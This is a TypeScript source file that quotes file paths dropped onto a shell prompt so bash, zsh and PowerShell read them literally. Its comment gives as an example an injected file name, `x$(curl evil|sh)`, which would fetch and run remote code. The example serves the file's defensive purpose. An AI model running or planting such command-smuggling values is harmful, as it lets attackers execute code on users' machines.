/**
 * Shell-literal quoting for paths inserted at a prompt (drag-and-drop).
 *
 * Double quotes do NOT suppress substitution in bash/zsh ($var, $(cmd),
 * backticks) — a dragged file named `x$(curl evil|sh)` or `cost $2.txt`
 * must never arrive as bare text (Enter would execute it). Single quotes
 * are fully literal in bash/zsh AND pwsh, so anything not obviously plain
 * gets single-quoted:
 *   - pwsh escapes ' by doubling:      'it''s file'
 *   - bash/zsh escape as close-reopen: 'it'\''s file'
 * The plain fast path keeps everyday paths unquoted (readable, copyable).
 */

/** Segments that need no quoting in any of our shells. */
const PLAIN = /^[A-Za-z0-9_./:@+-]+$/;

/** Quote `path` for literal insertion at a shell prompt. */
export function quoteForShell(path: string, isWindows: boolean): string {
  if (PLAIN.test(path)) return path;
  return isWindows
    ? `'${path.replace(/'/g, "''")}'`
    : `'${path.replace(/'/g, "'\\''")}'`;
}
